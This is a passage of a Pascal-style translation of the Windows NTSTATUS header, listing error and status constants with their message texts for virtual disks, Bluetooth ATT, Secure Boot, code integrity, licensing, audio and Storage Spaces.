// The disk must be offline or read-only.
//
STATUS_VIRTDISK_DISK_ONLINE_AND_WRITABLE = NTSTATUS($C03A001F);

//
// MessageId: STATUS_CTLOG_TRACKING_NOT_INITIALIZED
//
// MessageText:
//
// Change Tracking is not initialized for this virtual disk.
//
STATUS_CTLOG_TRACKING_NOT_INITIALIZED = NTSTATUS($C03A0020);

//
// MessageId: STATUS_CTLOG_LOGFILE_SIZE_EXCEEDED_MAXSIZE
//
// MessageText:
//
// Size of change tracking file exceeded the maximum size limit.
//
STATUS_CTLOG_LOGFILE_SIZE_EXCEEDED_MAXSIZE = NTSTATUS($C03A0021);

//
// MessageId: STATUS_CTLOG_VHD_CHANGED_OFFLINE
//
// MessageText:
//
// VHD file is changed due to compaction, expansion, or offline updates.
//
STATUS_CTLOG_VHD_CHANGED_OFFLINE = NTSTATUS($C03A0022);

//
// MessageId: STATUS_CTLOG_INVALID_TRACKING_STATE
//
// MessageText:
//
// Change Tracking for the virtual disk is not in a valid state to perform this request.  Change tracking could be discontinued or already in the requested state.
//
STATUS_CTLOG_INVALID_TRACKING_STATE = NTSTATUS($C03A0023);

//
// MessageId: STATUS_CTLOG_INCONSISTENT_TRACKING_FILE
//
// MessageText:
//
// Change Tracking file for the virtual disk is not in a valid state.
//
STATUS_CTLOG_INCONSISTENT_TRACKING_FILE = NTSTATUS($C03A0024);

//
// MessageId: STATUS_VHD_METADATA_FULL
//
// MessageText:
//
// There is not enough space in the virtual disk file for the provided metadata item.
//
STATUS_VHD_METADATA_FULL         = NTSTATUS($C03A0028);

//
// MessageId: STATUS_VHD_INVALID_CHANGE_TRACKING_ID
//
// MessageText:
//
// The specified change tracking identifier is not valid.
//
STATUS_VHD_INVALID_CHANGE_TRACKING_ID = NTSTATUS($C03A0029);

//
// MessageId: STATUS_VHD_CHANGE_TRACKING_DISABLED
//
// MessageText:
//
// Change tracking is disabled for the specified virtual hard disk, so no change tracking information is available.
//
STATUS_VHD_CHANGE_TRACKING_DISABLED = NTSTATUS($C03A002A);

//
// MessageId: STATUS_VHD_MISSING_CHANGE_TRACKING_INFORMATION
//
// MessageText:
//
// There is no change tracking data available associated with the specified change tracking identifier.
//
STATUS_VHD_MISSING_CHANGE_TRACKING_INFORMATION = NTSTATUS($C03A0030);

//
// MessageId: STATUS_VHD_RESIZE_WOULD_TRUNCATE_DATA
//
// MessageText:
//
// The requested resize operation might truncate user data residing on the virtual disk.
//
STATUS_VHD_RESIZE_WOULD_TRUNCATE_DATA = NTSTATUS($C03A0031);

//
// MessageId: STATUS_VHD_COULD_NOT_COMPUTE_MINIMUM_VIRTUAL_SIZE
//
// MessageText:
//
// The minimum safe size of the virtual disk could not be determined. This may be due to a missing or corrupt partition table.
//
STATUS_VHD_COULD_NOT_COMPUTE_MINIMUM_VIRTUAL_SIZE = NTSTATUS($C03A0032);

//
// MessageId: STATUS_VHD_ALREADY_AT_OR_BELOW_MINIMUM_VIRTUAL_SIZE
//
// MessageText:
//
// The size of the virtual disk cannot be safely reduced further.
//
STATUS_VHD_ALREADY_AT_OR_BELOW_MINIMUM_VIRTUAL_SIZE = NTSTATUS($C03A0033);


//
// Vhd warnings.
//

//
// MessageId: STATUS_QUERY_STORAGE_ERROR
//
// MessageText:
//
// The virtualization storage subsystem has generated an error.
//
STATUS_QUERY_STORAGE_ERROR       = NTSTATUS($803A0001);


//
// NtGdi warnings.
//

//
// MessageId: STATUS_GDI_HANDLE_LEAK
//
// MessageText:
//
// GDI handles were potentially leaked by the application.
//
STATUS_GDI_HANDLE_LEAK           = NTSTATUS($803F0001);


//
// Resume Key Filter (RKF) error codes.
//
//
// MessageId: STATUS_RKF_KEY_NOT_FOUND
//
// MessageText:
//
// The Resume Key Filter could not find the resume key supplied for the operation.
//
STATUS_RKF_KEY_NOT_FOUND         = NTSTATUS($C0400001);

//
// MessageId: STATUS_RKF_DUPLICATE_KEY
//
// MessageText:
//
// The Resume Key Filter found an existing resume key that matches the one supplied for the handle.
//
STATUS_RKF_DUPLICATE_KEY         = NTSTATUS($C0400002);

//
// MessageId: STATUS_RKF_BLOB_FULL
//
// MessageText:
//
// The Resume Key Filter data blob attached to the handle is full. No more space is available.
//
STATUS_RKF_BLOB_FULL             = NTSTATUS($C0400003);

//
// MessageId: STATUS_RKF_STORE_FULL
//
// MessageText:
//
// The Resume Key Filter handle store is full. No more resume handles can be accepted.
//
STATUS_RKF_STORE_FULL            = NTSTATUS($C0400004);

//
// MessageId: STATUS_RKF_FILE_BLOCKED
//
// MessageText:
//
// The Resume Key Filter failed the operation because the file is temporarily blocked pending the resume of existing handles on the file.
//
STATUS_RKF_FILE_BLOCKED          = NTSTATUS($C0400005);

//
// MessageId: STATUS_RKF_ACTIVE_KEY
//
// MessageText:
//
// The Resume Key Filter found an existing resume key that matches the one supplied on a handle that's active/open. The operation requires an inactive/closed handle.
//
STATUS_RKF_ACTIVE_KEY            = NTSTATUS($C0400006);


//
// RDBSS / MiniRdr internal error codes.
//
//
// MessageId: STATUS_RDBSS_RESTART_OPERATION
//
// MessageText:
//
// The operation must be restarted by RDBSS.
//
STATUS_RDBSS_RESTART_OPERATION   = NTSTATUS($C0410001);

//
// MessageId: STATUS_RDBSS_CONTINUE_OPERATION
//
// MessageText:
//
// The operation must continue processing.
//
STATUS_RDBSS_CONTINUE_OPERATION  = NTSTATUS($C0410002);

//
// MessageId: STATUS_RDBSS_POST_OPERATION
//
// MessageText:
//
// The operation must be posted to a thread to be retried at passive IRQL.
//
STATUS_RDBSS_POST_OPERATION      = NTSTATUS($C0410003);

//
// MessageId: STATUS_RDBSS_RETRY_LOOKUP
//
// MessageText:
//
// The caller must retry by looking up the object in the name table.
//
STATUS_RDBSS_RETRY_LOOKUP        = NTSTATUS($C0410004);

//
// Bluetooth Attribute Protocol Warnings
//

//
// MessageId: STATUS_BTH_ATT_INVALID_HANDLE
//
// MessageText:
//
// The attribute handle given was not valid on this server.
//
STATUS_BTH_ATT_INVALID_HANDLE    = NTSTATUS($C0420001);

//
// MessageId: STATUS_BTH_ATT_READ_NOT_PERMITTED
//
// MessageText:
//
// The attribute cannot be read.
//
STATUS_BTH_ATT_READ_NOT_PERMITTED = NTSTATUS($C0420002);

//
// MessageId: STATUS_BTH_ATT_WRITE_NOT_PERMITTED
//
// MessageText:
//
// The attribute cannot be written.
//
STATUS_BTH_ATT_WRITE_NOT_PERMITTED = NTSTATUS($C0420003);

//
// MessageId: STATUS_BTH_ATT_INVALID_PDU
//
// MessageText:
//
// The attribute PDU was invalid.
//
STATUS_BTH_ATT_INVALID_PDU       = NTSTATUS($C0420004);

//
// MessageId: STATUS_BTH_ATT_INSUFFICIENT_AUTHENTICATION
//
// MessageText:
//
// The attribute requires authentication before it can be read or written.
//
STATUS_BTH_ATT_INSUFFICIENT_AUTHENTICATION = NTSTATUS($C0420005);

//
// MessageId: STATUS_BTH_ATT_REQUEST_NOT_SUPPORTED
//
// MessageText:
//
// Attribute server does not support the request received from the client.
//
STATUS_BTH_ATT_REQUEST_NOT_SUPPORTED = NTSTATUS($C0420006);

//
// MessageId: STATUS_BTH_ATT_INVALID_OFFSET
//
// MessageText:
//
// Offset specified was past the end of the attribute.
//
STATUS_BTH_ATT_INVALID_OFFSET    = NTSTATUS($C0420007);

//
// MessageId: STATUS_BTH_ATT_INSUFFICIENT_AUTHORIZATION
//
// MessageText:
//
// The attribute requires authorization before it can be read or written.
//
STATUS_BTH_ATT_INSUFFICIENT_AUTHORIZATION = NTSTATUS($C0420008);

//
// MessageId: STATUS_BTH_ATT_PREPARE_QUEUE_FULL
//
// MessageText:
//
// Too many prepare writes have been queued.
//
STATUS_BTH_ATT_PREPARE_QUEUE_FULL = NTSTATUS($C0420009);

//
// MessageId: STATUS_BTH_ATT_ATTRIBUTE_NOT_FOUND
//
// MessageText:
//
// No attribute found within the given attribute handle range.
//
STATUS_BTH_ATT_ATTRIBUTE_NOT_FOUND = NTSTATUS($C042000A);

//
// MessageId: STATUS_BTH_ATT_ATTRIBUTE_NOT_LONG
//
// MessageText:
//
// The attribute cannot be read or written using the Read Blob Request.
//
STATUS_BTH_ATT_ATTRIBUTE_NOT_LONG = NTSTATUS($C042000B);

//
// MessageId: STATUS_BTH_ATT_INSUFFICIENT_ENCRYPTION_KEY_SIZE
//
// MessageText:
//
// The Encryption Key Size used for encrypting this link is insufficient.
//
STATUS_BTH_ATT_INSUFFICIENT_ENCRYPTION_KEY_SIZE = NTSTATUS($C042000C);

//
// MessageId: STATUS_BTH_ATT_INVALID_ATTRIBUTE_VALUE_LENGTH
//
// MessageText:
//
// The attribute value length is invalid for the operation.
//
STATUS_BTH_ATT_INVALID_ATTRIBUTE_VALUE_LENGTH = NTSTATUS($C042000D);

//
// MessageId: STATUS_BTH_ATT_UNLIKELY
//
// MessageText:
//
// The attribute request that was requested has encountered an error that was unlikely, and therefore could not be completed as requested.
//
STATUS_BTH_ATT_UNLIKELY          = NTSTATUS($C042000E);

//
// MessageId: STATUS_BTH_ATT_INSUFFICIENT_ENCRYPTION
//
// MessageText:
//
// The attribute requires encryption before it can be read or written.
//
STATUS_BTH_ATT_INSUFFICIENT_ENCRYPTION = NTSTATUS($C042000F);

//
// MessageId: STATUS_BTH_ATT_UNSUPPORTED_GROUP_TYPE
//
// MessageText:
//
// The attribute type is not a supported grouping attribute as defined by a higher layer specification.
//
STATUS_BTH_ATT_UNSUPPORTED_GROUP_TYPE = NTSTATUS($C0420010);

//
// MessageId: STATUS_BTH_ATT_INSUFFICIENT_RESOURCES
//
// MessageText:
//
// Insufficient Resources to complete the request.
//
STATUS_BTH_ATT_INSUFFICIENT_RESOURCES = NTSTATUS($C0420011);

//
// MessageId: STATUS_BTH_ATT_UNKNOWN_ERROR
//
// MessageText:
//
// An error that lies in the reserved range has been received.
//
STATUS_BTH_ATT_UNKNOWN_ERROR     = NTSTATUS($C0421000);

//
// Secure Boot error messages.
//
//
// MessageId: STATUS_SECUREBOOT_ROLLBACK_DETECTED
//
// MessageText:
//
// Secure Boot detected that rollback of protected data has been attempted.
//
STATUS_SECUREBOOT_ROLLBACK_DETECTED = NTSTATUS($C0430001);

//
// MessageId: STATUS_SECUREBOOT_POLICY_VIOLATION
//
// MessageText:
//
// The value is protected by Secure Boot policy and cannot be modified or deleted.
//
STATUS_SECUREBOOT_POLICY_VIOLATION = NTSTATUS($C0430002);

//
// MessageId: STATUS_SECUREBOOT_INVALID_POLICY
//
// MessageText:
//
// The Secure Boot policy is invalid.
//
STATUS_SECUREBOOT_INVALID_POLICY = NTSTATUS($C0430003);

//
// MessageId: STATUS_SECUREBOOT_POLICY_PUBLISHER_NOT_FOUND
//
// MessageText:
//
// A new Secure Boot policy did not contain the current publisher on its update list.
//
STATUS_SECUREBOOT_POLICY_PUBLISHER_NOT_FOUND = NTSTATUS($C0430004);

//
// MessageId: STATUS_SECUREBOOT_POLICY_NOT_SIGNED
//
// MessageText:
//
// The Secure Boot policy is either not signed or is signed by a non-trusted signer.
//
STATUS_SECUREBOOT_POLICY_NOT_SIGNED = NTSTATUS($C0430005);

//
// MessageId: STATUS_SECUREBOOT_NOT_ENABLED
//
// MessageText:
//
// Secure Boot is not enabled on this machine.
//
STATUS_SECUREBOOT_NOT_ENABLED    = NTSTATUS($80430006);

//
// MessageId: STATUS_SECUREBOOT_FILE_REPLACED
//
// MessageText:
//
// Secure Boot requires that certain files and drivers are not replaced by other files or drivers.
//
STATUS_SECUREBOOT_FILE_REPLACED  = NTSTATUS($C0430007);

//
// MessageId: STATUS_SECUREBOOT_POLICY_NOT_AUTHORIZED
//
// MessageText:
//
// The Secure Boot Supplemental Policy file was not authorized on this machine.
//
STATUS_SECUREBOOT_POLICY_NOT_AUTHORIZED = NTSTATUS($C0430008);

//
// MessageId: STATUS_SECUREBOOT_POLICY_UNKNOWN
//
// MessageText:
//
// The Supplemental Policy is not recognized on this device.
//
STATUS_SECUREBOOT_POLICY_UNKNOWN = NTSTATUS($C0430009);

//
// MessageId: STATUS_SECUREBOOT_POLICY_MISSING_ANTIROLLBACKVERSION
//
// MessageText:
//
// The Antirollback version was not found in the Secure Boot Policy.
//
STATUS_SECUREBOOT_POLICY_MISSING_ANTIROLLBACKVERSION = NTSTATUS($C043000A);

//
// MessageId: STATUS_SECUREBOOT_PLATFORM_ID_MISMATCH
//
// MessageText:
//
// The Platform ID specified in the Secure Boot policy does not match the Platform ID on this device.
//
STATUS_SECUREBOOT_PLATFORM_ID_MISMATCH = NTSTATUS($C043000B);

//
// MessageId: STATUS_SECUREBOOT_POLICY_ROLLBACK_DETECTED
//
// MessageText:
//
// The Secure Boot policy file has an older Antirollback Version than this device.
//
STATUS_SECUREBOOT_POLICY_ROLLBACK_DETECTED = NTSTATUS($C043000C);

//
// MessageId: STATUS_SECUREBOOT_POLICY_UPGRADE_MISMATCH
//
// MessageText:
//
// The Secure Boot policy file does not match the upgraded legacy policy.
//
STATUS_SECUREBOOT_POLICY_UPGRADE_MISMATCH = NTSTATUS($C043000D);

//
// MessageId: STATUS_SECUREBOOT_REQUIRED_POLICY_FILE_MISSING
//
// MessageText:
//
// The Secure Boot policy file is required but could not be found.
//
STATUS_SECUREBOOT_REQUIRED_POLICY_FILE_MISSING = NTSTATUS($C043000E);

//
// MessageId: STATUS_SECUREBOOT_NOT_BASE_POLICY
//
// MessageText:
//
// Supplemental Secure Boot policy file can not be loaded as a base Secure Boot policy.
//
STATUS_SECUREBOOT_NOT_BASE_POLICY = NTSTATUS($C043000F);

//
// MessageId: STATUS_SECUREBOOT_NOT_SUPPLEMENTAL_POLICY
//
// MessageText:
//
// Base Secure Boot policy file can not be loaded as a Supplemental Secure Boot policy.
//
STATUS_SECUREBOOT_NOT_SUPPLEMENTAL_POLICY = NTSTATUS($C0430010);

//
// Platform Manifest Error Messages
//
//
// MessageId: STATUS_PLATFORM_MANIFEST_NOT_AUTHORIZED
//
// MessageText:
//
// The Platform Manifest file was not authorized on this machine.
//
STATUS_PLATFORM_MANIFEST_NOT_AUTHORIZED = NTSTATUS($C0EB0001);

//
// MessageId: STATUS_PLATFORM_MANIFEST_INVALID
//
// MessageText:
//
// The Platform Manifest file was not valid.
//
STATUS_PLATFORM_MANIFEST_INVALID = NTSTATUS($C0EB0002);

//
// MessageId: STATUS_PLATFORM_MANIFEST_FILE_NOT_AUTHORIZED
//
// MessageText:
//
// The file is not authorized on this platform because an entry was not found in the Platform Manifest.
//
STATUS_PLATFORM_MANIFEST_FILE_NOT_AUTHORIZED = NTSTATUS($C0EB0003);

//
// MessageId: STATUS_PLATFORM_MANIFEST_CATALOG_NOT_AUTHORIZED
//
// MessageText:
//
// The catalog is not authorized on this platform because an entry was not found in the Platform Manifest.
//
STATUS_PLATFORM_MANIFEST_CATALOG_NOT_AUTHORIZED = NTSTATUS($C0EB0004);

//
// MessageId: STATUS_PLATFORM_MANIFEST_BINARY_ID_NOT_FOUND
//
// MessageText:
//
// The file is not authorized on this platform because a Binary ID was not found in the embedded signature.
//
STATUS_PLATFORM_MANIFEST_BINARY_ID_NOT_FOUND = NTSTATUS($C0EB0005);

//
// MessageId: STATUS_PLATFORM_MANIFEST_NOT_ACTIVE
//
// MessageText:
//
// No active Platform Manifest exists on this system.
//
STATUS_PLATFORM_MANIFEST_NOT_ACTIVE = NTSTATUS($C0EB0006);

//
// MessageId: STATUS_PLATFORM_MANIFEST_NOT_SIGNED
//
// MessageText:
//
// The Platform Manifest file was not properly signed.
//
STATUS_PLATFORM_MANIFEST_NOT_SIGNED = NTSTATUS($C0EB0007);

//
// System Integrity Policy error messages.
//
//
// MessageId: STATUS_SYSTEM_INTEGRITY_ROLLBACK_DETECTED
//
// MessageText:
//
// System Integrity detected that policy rollback has been attempted.
//
STATUS_SYSTEM_INTEGRITY_ROLLBACK_DETECTED = NTSTATUS($C0E90001);

//
// MessageId: STATUS_SYSTEM_INTEGRITY_POLICY_VIOLATION
//
// MessageText:
//
// System Integrity policy has been violated.
//
STATUS_SYSTEM_INTEGRITY_POLICY_VIOLATION = NTSTATUS($C0E90002);

//
// MessageId: STATUS_SYSTEM_INTEGRITY_INVALID_POLICY
//
// MessageText:
//
// The System Integrity policy is invalid.
//
STATUS_SYSTEM_INTEGRITY_INVALID_POLICY = NTSTATUS($C0E90003);

//
// MessageId: STATUS_SYSTEM_INTEGRITY_POLICY_NOT_SIGNED
//
// MessageText:
//
// The System Integrity policy is either not signed or is signed by a non-trusted signer.
//
STATUS_SYSTEM_INTEGRITY_POLICY_NOT_SIGNED = NTSTATUS($C0E90004);

//
// MessageId: STATUS_SYSTEM_INTEGRITY_TOO_MANY_POLICIES
//
// MessageText:
//
// The number of System Integrity policies is out of limit.
//
STATUS_SYSTEM_INTEGRITY_TOO_MANY_POLICIES = NTSTATUS($C0E90005);

//
// MessageId: STATUS_SYSTEM_INTEGRITY_SUPPLEMENTAL_POLICY_NOT_AUTHORIZED
//
// MessageText:
//
// The Code Integrity supplemental policy is not authorized by a Code Integrity base policy.
//
STATUS_SYSTEM_INTEGRITY_SUPPLEMENTAL_POLICY_NOT_AUTHORIZED = NTSTATUS($C0E90006);

//
// Clip modern app and windows licensing error messages.
//
//
// MessageId: STATUS_NO_APPLICABLE_APP_LICENSES_FOUND
//
// MessageText:
//
// No applicable app licenses found.
//
STATUS_NO_APPLICABLE_APP_LICENSES_FOUND = NTSTATUS($C0EA0001);

//
// MessageId: STATUS_CLIP_LICENSE_NOT_FOUND
//
// MessageText:
//
// CLiP license not found.
//
STATUS_CLIP_LICENSE_NOT_FOUND    = NTSTATUS($C0EA0002);

//
// MessageId: STATUS_CLIP_DEVICE_LICENSE_MISSING
//
// MessageText:
//
// CLiP device license not found.
//
STATUS_CLIP_DEVICE_LICENSE_MISSING = NTSTATUS($C0EA0003);

//
// MessageId: STATUS_CLIP_LICENSE_INVALID_SIGNATURE
//
// MessageText:
//
// CLiP license has an invalid signature.
//
STATUS_CLIP_LICENSE_INVALID_SIGNATURE = NTSTATUS($C0EA0004);

//
// MessageId: STATUS_CLIP_KEYHOLDER_LICENSE_MISSING_OR_INVALID
//
// MessageText:
//
// CLiP keyholder license is invalid or missing.
//
STATUS_CLIP_KEYHOLDER_LICENSE_MISSING_OR_INVALID = NTSTATUS($C0EA0005);

//
// MessageId: STATUS_CLIP_LICENSE_EXPIRED
//
// MessageText:
//
// CLiP license has expired.
//
STATUS_CLIP_LICENSE_EXPIRED      = NTSTATUS($C0EA0006);

//
// MessageId: STATUS_CLIP_LICENSE_SIGNED_BY_UNKNOWN_SOURCE
//
// MessageText:
//
// CLiP license is signed by an unknown source.
//
STATUS_CLIP_LICENSE_SIGNED_BY_UNKNOWN_SOURCE = NTSTATUS($C0EA0007);

//
// MessageId: STATUS_CLIP_LICENSE_NOT_SIGNED
//
// MessageText:
//
// CLiP license is not signed.
//
STATUS_CLIP_LICENSE_NOT_SIGNED   = NTSTATUS($C0EA0008);

//
// MessageId: STATUS_CLIP_LICENSE_HARDWARE_ID_OUT_OF_TOLERANCE
//
// MessageText:
//
// CLiP license hardware ID is out of tolerance.
//
STATUS_CLIP_LICENSE_HARDWARE_ID_OUT_OF_TOLERANCE = NTSTATUS($C0EA0009);

//
// MessageId: STATUS_CLIP_LICENSE_DEVICE_ID_MISMATCH
//
// MessageText:
//
// CLiP license device ID does not match the device ID in the bound device license.
//
STATUS_CLIP_LICENSE_DEVICE_ID_MISMATCH = NTSTATUS($C0EA000A);

//
// Audio error messages.
//
//
// MessageId: STATUS_AUDIO_ENGINE_NODE_NOT_FOUND
//
// MessageText:
//
// PortCls could not find an audio engine node exposed by a miniport driver claiming support for IMiniportAudioEngineNode.
//
STATUS_AUDIO_ENGINE_NODE_NOT_FOUND = NTSTATUS($C0440001);

//
// MessageId: STATUS_HDAUDIO_EMPTY_CONNECTION_LIST
//
// MessageText:
//
// HD Audio widget encountered an unexpected empty connection list.
//
STATUS_HDAUDIO_EMPTY_CONNECTION_LIST = NTSTATUS($C0440002);

//
// MessageId: STATUS_HDAUDIO_CONNECTION_LIST_NOT_SUPPORTED
//
// MessageText:
//
// HD Audio widget does not support the connection list parameter.
//
STATUS_HDAUDIO_CONNECTION_LIST_NOT_SUPPORTED = NTSTATUS($C0440003);

//
// MessageId: STATUS_HDAUDIO_NO_LOGICAL_DEVICES_CREATED
//
// MessageText:
//
// No HD Audio subdevices were successfully created.
//
STATUS_HDAUDIO_NO_LOGICAL_DEVICES_CREATED = NTSTATUS($C0440004);

//
// MessageId: STATUS_HDAUDIO_NULL_LINKED_LIST_ENTRY
//
// MessageText:
//
// An unexpected NULL pointer was encountered in a linked list.
//
STATUS_HDAUDIO_NULL_LINKED_LIST_ENTRY = NTSTATUS($C0440005);

//
// Spaceport success codes (spaceport.sys)
//
//
// MessageId: STATUS_SPACES_REPAIRED
//
// MessageText:
//
// The repair was successful.
//
STATUS_SPACES_REPAIRED           = NTSTATUS($00E70000);

//
// MessageId: STATUS_SPACES_PAUSE
//
// MessageText:
//
// The operation has been paused.
//
STATUS_SPACES_PAUSE              = NTSTATUS($00E70001);

//
// MessageId: STATUS_SPACES_COMPLETE
//
// MessageText:
//
// The operation is complete.
//
STATUS_SPACES_COMPLETE           = NTSTATUS($00E70002);

//
// MessageId: STATUS_SPACES_REDIRECT
//
// MessageText:
//
// The operation should be redirected to another node.
//
STATUS_SPACES_REDIRECT           = NTSTATUS($00E70003);

//
// Spaceport error codes (spaceport.sys)
//
//
// MessageId: STATUS_SPACES_FAULT_DOMAIN_TYPE_INVALID
//
// MessageText:
//
// The specified fault domain type or combination of minimum / maximum fault domain type is not valid.
//
STATUS_SPACES_FAULT_DOMAIN_TYPE_INVALID = NTSTATUS($C0E70001);

//
// MessageId: STATUS_SPACES_RESILIENCY_TYPE_INVALID
//
// MessageText:
//
// The specified resiliency type is not valid.
//
STATUS_SPACES_RESILIENCY_TYPE_INVALID = NTSTATUS($C0E70003);

//
// MessageId: STATUS_SPACES_DRIVE_SECTOR_SIZE_INVALID
//
// MessageText:
//
// The sector size of the physical disk is not supported by the storage pool.
//
STATUS_SPACES_DRIVE_SECTOR_SIZE_INVALID = NTSTATUS($C0E70004);

//
// MessageId: STATUS_SPACES_DRIVE_REDUNDANCY_INVALID
//
// MessageText:
//
// The value for fault tolerance is outside of the supported range of values.
//
STATUS_SPACES_DRIVE_REDUNDANCY_INVALID = NTSTATUS($C0E70006);

//
// MessageId: STATUS_SPACES_NUMBER_OF_DATA_COPIES_INVALID
//
// MessageText:
//
// The number of data copies requested is outside of the supported range of values.
//
STATUS_SPACES_NUMBER_OF_DATA_COPIES_INVALID = NTSTATUS($C0E70007);

//
// MessageId: STATUS_SPACES_INTERLEAVE_LENGTH_INVALID
//
// MessageText:
//
// The value for interleave length is outside of the supported range of values or is not a power of 2.
//
STATUS_SPACES_INTERLEAVE_LENGTH_INVALID = NTSTATUS($C0E70009);

//
// MessageId: STATUS_SPACES_NUMBER_OF_COLUMNS_INVALID
//
// MessageText:
//
// The number of columns specified is outside of the supported range of values.
//
STATUS_SPACES_NUMBER_OF_COLUMNS_INVALID = NTSTATUS($C0E7000A);

//
// MessageId: STATUS_SPACES_NOT_ENOUGH_DRIVES
//
// MessageText:
//
// There were not enough physical disks to complete the requested operation.
//
STATUS_SPACES_NOT_ENOUGH_DRIVES  = NTSTATUS($C0E7000B);

//
// MessageId: STATUS_SPACES_EXTENDED_ERROR
//
// MessageText:
//
// Extended error information is available.
//
STATUS_SPACES_EXTENDED_ERROR     = NTSTATUS($C0E7000C);

//
// MessageId: STATUS_SPACES_PROVISIONING_TYPE_INVALID
//
// MessageText:
//
// The specified provisioning type is not valid.
//
STATUS_SPACES_PROVISIONING_TYPE_INVALID = NTSTATUS($C0E7000D);

//
// MessageId: STATUS_SPACES_ALLOCATION_SIZE_INVALID
//
// MessageText:
//
// The allocation size is outside of the supported range of values.
//
STATUS_SPACES_ALLOCATION_SIZE_INVALID = NTSTATUS($C0E7000E);

//
// MessageId: STATUS_SPACES_ENCLOSURE_AWARE_INVALID
//
// MessageText:
//
// Enclosure awareness is not supported for this virtual disk.
//
STATUS_SPACES_ENCLOSURE_AWARE_INVALID = NTSTATUS($C0E7000F);

//
// MessageId: STATUS_SPACES_WRITE_CACHE_SIZE_INVALID
//
// MessageText:
//
// The write cache size is outside of the supported range of values.
//
STATUS_SPACES_WRITE_CACHE_SIZE_INVALID = NTSTATUS($C0E70010);

//
// MessageId: STATUS_SPACES_NUMBER_OF_GROUPS_INVALID
//
// MessageText:
//
// The value for number of groups is outside of the supported range of values.
//
STATUS_SPACES_NUMBER_OF_GROUPS_INVALID = NTSTATUS($C0E70011);

//
// MessageId: STATUS_SPACES_DRIVE_OPERATIONAL_STATE_INVALID
//
// MessageText:
//
// The OperationalState of the physical disk is invalid for this operation.
//
STATUS_SPACES_DRIVE_OPERATIONAL_STATE_INVALID = NTSTATUS($C0E70012);

//
// MessageId: STATUS_SPACES_UPDATE_COLUMN_STATE
//
// MessageText:
//
// A column's state needs to be updated.
//
STATUS_SPACES_UPDATE_COLUMN_STATE = NTSTATUS($C0E70013);

//
// MessageId: STATUS_SPACES_MAP_REQUIRED
//
// MessageText:
//
// An extent needs to be allocated.
//
STATUS_SPACES_MAP_REQUIRED       = NTSTATUS($C0E70014);

//
// MessageId: STATUS_SPACES_UNSUPPORTED_VERSION
//
// MessageText:
//
// The metadata version is unsupported.
//
STATUS_SPACES_UNSUPPORTED_VERSION = NTSTATUS($C0E70015);

//
// MessageId: STATUS_SPACES_CORRUPT_METADATA
//
// MessageText:
//
// The metadata read was corrupt.
//
STATUS_SPACES_CORRUPT_METADATA   = NTSTATUS($C0E70016);

//
// MessageId: STATUS_SPACES_DRT_FULL
//
// MessageText:
//
// The DRT is full.
//
STATUS_SPACES_DRT_FULL           = NTSTATUS($C0E70017);

//
// MessageId: STATUS_SPACES_INCONSISTENCY
//
// MessageText:
//
// An inconsistency was found.
//
STATUS_SPACES_INCONSISTENCY      = NTSTATUS($C0E70018);

//
// MessageId: STATUS_SPACES_LOG_NOT_READY
//
// MessageText:
//
// The log is not ready.
//
STATUS_SPACES_LOG_NOT_READY      = NTSTATUS($C0E70019);

//
// MessageId: STATUS_SPACES_NO_REDUNDANCY
//
// MessageText:
//
// No good copy of data was available.
//
STATUS_SPACES_NO_REDUNDANCY      = NTSTATUS($C0E7001A);

//
// MessageId: STATUS_SPACES_DRIVE_NOT_READY
//
// MessageText:
//
// The drive is not ready.
//
STATUS_SPACES_DRIVE_NOT_READY    = NTSTATUS($C0E7001B);

//
// MessageId: STATUS_SPACES_DRIVE_SPLIT
//
// MessageText:
//
// The data on this drive is stale.
//
STATUS_SPACES_DRIVE_SPLIT        = NTSTATUS($C0E7001C);

//
// MessageId: STATUS_SPACES_DRIVE_LOST_DATA
//
// MessageText:
//
// The data on this drive has been lost.
//
STATUS_SPACES_DRIVE_LOST_DATA    = NTSTATUS($C0E7001D);

//
// MessageId: STATUS_SPACES_ENTRY_INCOMPLETE
//
// MessageText:
//
// The specified log entry is not complete.
//
STATUS_SPACES_ENTRY_INCOMPLETE   = NTSTATUS($C0E7001E);

//
// MessageId: STATUS_SPACES_ENTRY_INVALID
//
// MessageText:
//
// The specified log entry is not valid.
//
STATUS_SPACES_ENTRY_INVALID      = NTSTATUS($C0E7001F);

//
// MessageId: STATUS_SPACES_MARK_DIRTY
//
// MessageText:
//
// A slab needs to be marked dirty.
//
STATUS_SPACES_MARK_DIRTY         = NTSTATUS($C0E70020);

//
// Volsnap status codes (volsnap.sys)
//
//
// MessageId: STATUS_VOLSNAP_BOOTFILE_NOT_VALID
//
// MessageText:
//
// The bootfile is too small to support persistent snapshots.
//
STATUS_VOLSNAP_BOOTFILE_NOT_VALID = NTSTATUS($C0500003);

//
// MessageId: STATUS_VOLSNAP_ACTIVATION_TIMEOUT
//
// MessageText:
//
// Activation of persistent snapshots on this volume took longer than was allowed.
//
STATUS_VOLSNAP_ACTIVATION_TIMEOUT = NTSTATUS($C0500004);

//
// Sdbus status codes (sdbus.sys)
//
//
// MessageId: STATUS_IO_PREEMPTED
//
// MessageText:
//
// The operation was preempted by a higher priority operation. It must be resumed later.
//
STATUS_IO_PREEMPTED              = NTSTATUS($C0510001);

//
// Shared VHDX status codes (svhdxflt.sys)
//
//
// MessageId: STATUS_SVHDX_ERROR_STORED
//
// MessageText:
//
// The proper error code with sense data was stored on server side.
//
STATUS_SVHDX_ERROR_STORED        = NTSTATUS($C05C0000);

//
// MessageId: STATUS_SVHDX_ERROR_NOT_AVAILABLE
//
// MessageText:
//
// The requested error data is not available on the server.
//
STATUS_SVHDX_ERROR_NOT_AVAILABLE = NTSTATUS($C05CFF00);

//
// MessageId: STATUS_SVHDX_UNIT_ATTENTION_AVAILABLE
//
// MessageText:
//
// Unit Attention data is available for the initiator to query.
//
STATUS_SVHDX_UNIT_ATTENTION_AVAILABLE = NTSTATUS($C05CFF01);

//
// MessageId: STATUS_SVHDX_UNIT_ATTENTION_CAPACITY_DATA_CHANGED
//
// MessageText:
//
// The data capacity of the device has changed, resulting in a Unit Attention condition.
//
STATUS_SVHDX_UNIT_ATTENTION_CAPACITY_DATA_CHANGED = NTSTATUS($C05CFF02);

//
// MessageId: STATUS_SVHDX_UNIT_ATTENTION_RESERVATIONS_PREEMPTED
//
// MessageText:
//
// A previous operation resulted in this initiator's reservations being preempted, resulting in a Unit Attention condition.
//
STATUS_SVHDX_UNIT_ATTENTION_RESERVATIONS_PREEMPTED = NTSTATUS($C05CFF03);

//
// MessageId: STATUS_SVHDX_UNIT_ATTENTION_RESERVATIONS_RELEASED
//
// MessageText:
//
// A previous operation resulted in this initiator's reservations being released, resulting in a Unit Attention condition.
//
